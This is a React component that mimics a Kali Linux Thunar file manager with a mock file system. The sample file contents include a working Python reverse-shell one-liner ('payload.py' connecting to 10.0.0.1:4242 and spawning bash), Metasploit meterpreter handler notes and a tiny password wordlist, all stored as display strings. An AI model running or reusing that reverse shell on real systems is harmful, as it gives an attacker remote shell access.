import React, { useState, useEffect, useRef } from 'react';
import { 
  ChevronLeft, 
  ChevronRight, 
  ArrowUp, 
  Home, 
  Search, 
  Menu,
  Folder,
  FileText,
  Image as ImageIcon,
  FileCode,
  Monitor,
  HardDrive,
  Download,
  Clock,
  Trash2,
  File,
  ChevronDown,
  X,
  Minus,
  Square,
  ExternalLink,
  Settings,
  Info,
  Maximize2
} from 'lucide-react';

// Mock File System Structure with Content for opening files
const MOCK_FS = {
  "/": { type: 'folder', name: '/', content: ['home', 'etc', 'bin', 'var', 'usr'] },
  "/home": { type: 'folder', name: 'home', content: ['kali'] },
  "/home/kali": { type: 'folder', name: 'kali', content: ['Desktop', 'Documents', 'Downloads', 'Music', 'Pictures', 'Videos', 'Public', 'Templates', '.bashrc'] },
  "/home/kali/Desktop": { type: 'folder', name: 'Desktop', content: ['nmap_scan.txt', 'metasploit_notes.md', 'payload.py'] },
  "/home/kali/Documents": { type: 'folder', name: 'Documents', content: ['Work', 'Personal', 'Report_2024.pdf'] },
  "/home/kali/Documents/Work": { type: 'folder', name: 'Work', content: ['Project_Alpha', 'Contracts'] },
  "/home/kali/Downloads": { type: 'folder', name: 'Downloads', content: ['wordlist.txt', 'linux_headers.deb'] },
  "/home/kali/Pictures": { type: 'folder', name: 'Pictures', content: ['wallpaper.jpg', 'screenshot_1.png'] },
  "/bin": { type: 'folder', name: 'bin', content: ['bash', 'ls', 'grep', 'cat'] },
  "/etc": { type: 'folder', name: 'etc', content: ['passwd', 'shadow', 'hosts'] },
  "file_metadata": {
    "nmap_scan.txt": { type: 'text', content: "Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-20 10:00 EDT\nNmap scan report for 192.168.1.1\nHost is up (0.0020s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http", icon: <FileText size={48} className="text-blue-400" /> },
    "metasploit_notes.md": { type: 'text', content: "# Metasploit Workflow\n1. use exploit/multi/handler\n2. set payload linux/x64/meterpreter/reverse_tcp\n3. set LHOST 10.0.2.15\n4. exploit -j", icon: <FileText size={48} className="text-blue-400" /> },
    "payload.py": { type: 'text', content: "import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4242))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/bash')", icon: <FileCode size={48} className="text-emerald-400" /> },
    "wallpaper.jpg": { type: 'image', url: 'https://images.unsplash.com/photo-1614850523296-d8c1af93d400?auto=format&fit=crop&q=80&w=800', icon: <ImageIcon size={48} className="text-purple-400" /> },
    "screenshot_1.png": { type: 'image', url: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=800', icon: <ImageIcon size={48} className="text-purple-400" /> },
    ".bashrc": { type: 'text', content: "export PATH=$PATH:/usr/local/bin\nalias ls='ls --color=auto'\nalias grep='grep --color=auto'", icon: <FileCode size={48} className="text-gray-400" /> },
    "wordlist.txt": { type: 'text', content: "admin\npassword\n123456\nqwerty\nroot\ntest", icon: <FileText size={48} className="text-blue-400" /> },
  }
};

const MENU_DATA = {
  File: ['New Tab', 'New Window', 'Create Folder', 'Create Document', 'Properties', 'Close'],
  Edit: ['Cut', 'Copy', 'Paste', 'Select All', 'Invert Selection'],
  View: ['Side Pane', 'Toolbar', 'Statusbar', 'Menubar', 'Hidden Files'],
  Go: ['Back', 'Forward', 'Up', 'Home', 'Desktop', 'Downloads'],
  Help: ['Contents', 'About Thunar', 'Kali Linux Docs']
};

const App = () => {
  const [currentPath, setCurrentPath] = useState('/home/kali');
  const [activeView, setActiveView] = useState('home'); 
  const [history, setHistory] = useState(['/home/kali']);
  const [historyIndex, setHistoryIndex] = useState(0);
  const [addressBarValue, setAddressBarValue] = useState('/home/kali');
  const [selectedItem, setSelectedItem] = useState(null);
  const [activeMenu, setActiveMenu] = useState(null);
  const [isMaximized, setIsMaximized] = useState(true);
  const [openFile, setOpenFile] = useState(null);

  const menuRef = useRef(null);

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (menuRef.current && !menuRef.current.contains(event.target)) {
        setActiveMenu(null);
      }
    };
    document.addEventListener('mousedown', handleClickOutside);
    return () => document.removeEventListener('mousedown', handleClickOutside);
  }, []);

  useEffect(() => {
    setAddressBarValue(currentPath);
  }, [currentPath]);

  const navigateTo = (path, viewType = null) => {
    if (!MOCK_FS[path] && !path.includes('.')) return;
    
    const newHistory = history.slice(0, historyIndex + 1);
    newHistory.push(path);
    setHistory(newHistory);
    setHistoryIndex(newHistory.length - 1);
    
    setCurrentPath(path);
    setSelectedItem(null);
    if (viewType) setActiveView(viewType);
    else if (path === '/home/kali') setActiveView('home');
    else setActiveView(null);
  };

  const handleItemDoubleClick = (itemName) => {
    const fullPath = currentPath === '/' ? `/${itemName}` : `${currentPath}/${itemName}`;
    if (MOCK_FS[fullPath]) {
      navigateTo(fullPath);
    } else {
      const fileData = MOCK_FS.file_metadata[itemName];
      if (fileData) {
        setOpenFile({ name: itemName, ...fileData });
      }
    }
  };

  const goBack = () => {
    if (historyIndex > 0) {
      const prevPath = history[historyIndex - 1];
      setHistoryIndex(historyIndex - 1);
      setCurrentPath(prevPath);
      setActiveView(null);
    }
  };

  const goForward = () => {
    if (historyIndex < history.length - 1) {
      const nextPath = history[historyIndex + 1];
      setHistoryIndex(historyIndex + 1);
      setCurrentPath(nextPath);
      setActiveView(null);
    }
  };

  const goUp = () => {
    if (currentPath === '/') return;
    const parts = currentPath.split('/').filter(Boolean);
    parts.pop();
    const parentPath = '/' + parts.join('/');
    navigateTo(parentPath || '/');
  };

  const handleAddressSubmit = (e) => {
    if (e.key === 'Enter') {
      const target = addressBarValue.trim();
      if (MOCK_FS[target]) navigateTo(target);
      else setAddressBarValue(currentPath);
    }
  };

  const items = MOCK_FS[currentPath]?.content || [];

  const SidebarLink = ({ icon: Icon, label, path, viewKey }) => {
    const isActive = viewKey ? activeView === viewKey : (currentPath === path && !activeView);
    return (
      <div 
        onClick={() => navigateTo(path, viewKey)}
        className={`flex items-center gap-3 px-3 py-1.5 cursor-default transition-colors rounded mx-1 ${
          isActive 
            ? 'bg-blue-600 text-white shadow-sm' 
            : 'text-gray-300 hover:bg-[#32363b] hover:text-white'
        }`}
      >
        <Icon size={16} className={isActive ? 'text-white' : 'text-blue-400'} />
        <span className="text-sm font-medium">{label}</span>
      </div>
    );
  };

  return (
    <div className={`flex flex-col h-screen bg-[#1a1c1e] font-sans text-gray-200 select-none overflow-hidden transition-all ${isMaximized ? 'w-full' : 'w-[92%] h-[88%] m-auto border border-[#3e444b] shadow-2xl rounded-lg mt-8'}`}>
      
      {/* Linux Style Title Bar (Circular Buttons) */}
      <div className="flex items-center justify-between bg-[#24282e] border-b border-black px-3 py-1.5 h-10 select-none">
        <div className="flex items-center gap-2">
          <div className="w-5 h-5 bg-blue-600 rounded flex items-center justify-center shadow-md">
            <Folder size={12} className="text-white" />
          </div>
          <span className="text-xs font-bold text-gray-400 tracking-tight uppercase">kali — Thunar</span>
        </div>
        
        {/* Linux Specific Window Buttons */}
        <div className="flex items-center gap-2">
          <button className="w-6 h-6 flex items-center justify-center hover:bg-white/10 rounded-full transition-colors">
            <Minus size={14} className="text-gray-400" />
          </button>
          <button 
            onClick={() => setIsMaximized(!isMaximized)}
            className="w-6 h-6 flex items-center justify-center hover:bg-white/10 rounded-full transition-colors"
          >
            <Square size={12} className="text-gray-400" />
          </button>
          <button className="w-6 h-6 flex items-center justify-center bg-transparent hover:bg-[#ff5f56] hover:text-white group rounded-full transition-all">
            <X size={14} className="text-gray-400 group-hover:text-white" />
          </button>
        </div>
      </div>

      {/* Dropdown Menu Bar */}
      <div className="flex items-center gap-1 px-2 py-0.5 bg-[#25282c] border-b border-black text-[13px] relative" ref={menuRef}>
        {Object.keys(MENU_DATA).map((menu) => (
          <div key={menu} className="relative">
            <button 
              onMouseDown={() => setActiveMenu(activeMenu === menu ? null : menu)}
              className={`px-3 py-1 rounded transition-colors ${activeMenu === menu ? 'bg-blue-600 text-white' : 'hover:bg-white/5'}`}
            >
              {menu}
            </button>
            {activeMenu === menu && (
              <div className="absolute top-full left-0 mt-0.5 w-48 bg-[#2a2d31] border border-black shadow-2xl rounded-b-md z-50 overflow-hidden py-1.5 animate-in fade-in zoom-in-95 duration-75">
                {MENU_DATA[menu].map((item) => (
                  <div key={item} className="px-4 py-1.5 hover:bg-blue-600 hover:text-white transition-colors cursor-default text-xs flex justify-between items-center">
                    {item}
                    <span className="text-[10px] opacity-40">Ctrl+{item[0]}</span>
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}
      </div>

      {/* Toolbar */}
      <div className="flex items-center gap-2 p-2 bg-[#2a2d31] border-b border-black shadow-lg">
        <div className="flex items-center gap-0.5 pr-2">
          <button 
            onClick={goBack} 
            disabled={historyIndex === 0}
            className={`p-1.5 rounded-full transition-colors ${historyIndex === 0 ? 'opacity-20 cursor-not-allowed text-gray-600' : 'hover:bg-white/10 text-blue-400'}`}
          >
            <ChevronLeft size={20} strokeWidth={3} />
          </button>
          <button 
            onClick={goForward} 
            disabled={historyIndex >= history.length - 1}
            className={`p-1.5 rounded-full transition-colors ${historyIndex >= history.length - 1 ? 'opacity-20 cursor-not-allowed text-gray-600' : 'hover:bg-white/10 text-blue-400'}`}
          >
            <ChevronRight size={20} strokeWidth={3} />
          </button>
          <button onClick={goUp} className="p-1.5 rounded-full hover:bg-white/10 text-blue-400 ml-1">
            <ArrowUp size={20} strokeWidth={3} />
          </button>
          <button onClick={() => navigateTo('/home/kali')} className="p-1.5 rounded-full hover:bg-white/10 text-blue-400">
            <Home size={20} strokeWidth={2.5} />
          </button>
        </div>

        {/* Path Input */}
        <div className="flex-1 flex items-center bg-[#1e2023] border border-black rounded px-2 py-1.5 shadow-inner group focus-within:ring-1 focus-within:ring-blue-500/50 transition-all">
          <Folder size={14} className="text-blue-500 mr-2" />
          <input 
            type="text" 
            value={addressBarValue}
            onChange={(e) => setAddressBarValue(e.target.value)}
            onKeyDown={handleAddressSubmit}
            className="w-full text-sm outline-none bg-transparent text-gray-200 font-mono"
          />
          <ChevronDown size={14} className="text-gray-500 ml-1 cursor-pointer hover:text-blue-400" />
        </div>

        <div className="flex items-center gap-1 pl-2">
          <div className="relative">
            <Search size={16} className="absolute left-2.5 top-2 text-gray-500" />
            <input 
              type="text" 
              placeholder="Search..." 
              className="bg-[#1e2023] border border-black rounded-full pl-9 pr-3 py-1.5 text-sm w-44 focus:w-64 focus:ring-1 focus:ring-blue-500/30 transition-all outline-none text-gray-300"
            />
          </div>
          <button className="p-2 rounded-full hover:bg-white/10 text-gray-400">
            <Menu size={20} />
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden">
        {/* Sidebar */}
        <div className="w-60 bg-[#25282c] border-r border-black py-4 flex flex-col gap-6 overflow-y-auto">
          <div>
            <div className="text-[10px] font-bold text-gray-500 uppercase tracking-[2px] mb-3 px-5 opacity-60">Places</div>
            <div className="flex flex-col gap-0.5">
              <SidebarLink icon={Clock} label="Recent" path="/home/kali" viewKey="recent" />
              <SidebarLink icon={Home} label="Home" path="/home/kali" viewKey="home" />
              <SidebarLink icon={Monitor} label="Desktop" path="/home/kali/Desktop" />
              <SidebarLink icon={FileText} label="Documents" path="/home/kali/Documents" />
              <SidebarLink icon={Download} label="Downloads" path="/home/kali/Downloads" />
              <SidebarLink icon={ImageIcon} label="Pictures" path="/home/kali/Pictures" />
              <SidebarLink icon={Trash2} label="Trash" path="/home/kali" viewKey="trash" />
            </div>
          </div>

          <div>
            <div className="text-[10px] font-bold text-gray-500 uppercase tracking-[2px] mb-3 px-5 opacity-60">Devices</div>
            <div className="flex flex-col gap-0.5">
              <SidebarLink icon={HardDrive} label="File System" path="/" />
            </div>
          </div>

          <div>
            <div className="text-[10px] font-bold text-gray-500 uppercase tracking-[2px] mb-3 px-5 opacity-60">Network</div>
            <div className="flex flex-col gap-0.5">
              <SidebarLink icon={ExternalLink} label="Browse Network" path="/" />
            </div>
          </div>
        </div>

        {/* File Content Grid */}
        <div 
          className="flex-1 p-4 bg-[#1a1c1e] overflow-y-auto custom-scrollbar relative"
          onClick={() => setSelectedItem(null)}
        >
          <div className="grid grid-cols-[repeat(auto-fill,minmax(110px,1fr))] gap-2">
            {items.map((itemName) => {
              const fullPath = currentPath === '/' ? `/${itemName}` : `${currentPath}/${itemName}`;
              const isFolder = MOCK_FS[fullPath];
              const isSelected = selectedItem === itemName;
              
              const fileInfo = MOCK_FS.file_metadata[itemName];
              const icon = isFolder 
                ? <Folder size={52} className="text-blue-500 fill-blue-500/10 drop-shadow-md" /> 
                : (fileInfo?.icon || <File size={52} className="text-gray-500" />);

              return (
                <div 
                  key={itemName}
                  onClick={(e) => {
                    e.stopPropagation();
                    setSelectedItem(itemName);
                  }}
                  onDoubleClick={() => handleItemDoubleClick(itemName)}
                  className={`flex flex-col items-center p-3 rounded-md cursor-default transition-all group border border-transparent ${
                    isSelected 
                      ? 'bg-blue-600/90 text-white border-blue-400 shadow-lg scale-105 z-10' 
                      : 'hover:bg-white/5 hover:border-white/10'
                  }`}
                >
                  <div className="mb-2 relative">
                    {icon}
                    {isFolder && isSelected && (
                      <div className="absolute -inset-1 bg-blue-400/20 blur-lg rounded-full animate-pulse"></div>
                    )}
                  </div>
                  <span className={`text-[11px] text-center break-all line-clamp-2 px-1 rounded leading-tight ${
                    isSelected ? 'text-white font-bold' : 'text-gray-300'
                  }`}>
                    {itemName}
                  </span>
                </div>
              );
            })}
          </div>

          {items.length === 0 && (
            <div className="flex flex-col items-center justify-center h-full text-gray-600 opacity-20">
              <Folder size={120} strokeWidth={1} className="mb-4" />
              <p className="text-xl font-medium tracking-wide">Empty Directory</p>
            </div>
          )}

          {/* INTERNAL FILE VIEWER (TEXT / IMAGE) */}
          {openFile && (
            <div className="absolute inset-4 bg-[#1a1c1e] border border-black shadow-2xl rounded-lg z-[100] flex flex-col animate-in fade-in zoom-in-95 duration-200">
              {/* Internal Window Bar */}
              <div className="flex items-center justify-between bg-[#24282e] border-b border-black p-2 rounded-t-lg">
                <div className="flex items-center gap-2">
                  <FileText size={14} className="text-blue-500" />
                  <span className="text-xs font-bold text-gray-400">{openFile.name} — Editor</span>
                </div>
                <button onClick={() => setOpenFile(null)} className="p-1 hover:bg-[#ff5f56] hover:text-white rounded-full transition-colors">
                  <X size={16} />
                </button>
              </div>
              
              <div className="flex-1 overflow-auto p-4 bg-[#0d0e10] rounded-b-lg">
                {openFile.type === 'text' ? (
                  <textarea 
                    className="w-full h-full bg-transparent text-gray-300 font-mono text-sm outline-none resize-none"
                    value={openFile.content}
                    readOnly
                  />
                ) : (
                  <div className="flex items-center justify-center h-full">
                    <img src={openFile.url} alt={openFile.name} className="max-w-full max-h-full rounded shadow-xl" />
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Status Bar */}
      <div className="bg-[#2a2d31] border-t border-black px-4 py-1.5 flex justify-between items-center text-[11px] text-gray-500 font-medium">
        <div className="flex gap-6 items-center">
          <span className="flex items-center gap-1.5 hover:text-gray-300 transition-colors cursor-default">
             <File size={10} /> {items.length} items
          </span>
          <span className="flex items-center gap-1.5 hover:text-gray-300 transition-colors cursor-default">
             <HardDrive size={10} /> 332.6 GB available
          </span>
        </div>
        <div className="flex items-center gap-4">
          <span className="font-mono text-blue-500 opacity-80">{currentPath}</span>
          <div className="h-3 w-px bg-white/10 mx-1"></div>
          <Settings size={13} className="cursor-pointer hover:text-blue-400 transition-colors" />
          <Info size={13} className="cursor-pointer hover:text-blue-400 transition-colors" />
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .custom-scrollbar::-webkit-scrollbar { width: 10px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: #1a1c1e; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #323539; border-radius: 5px; border: 2px solid #1a1c1e; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: #40444b; }
      `}} />
    </div>
  );
};

export default App;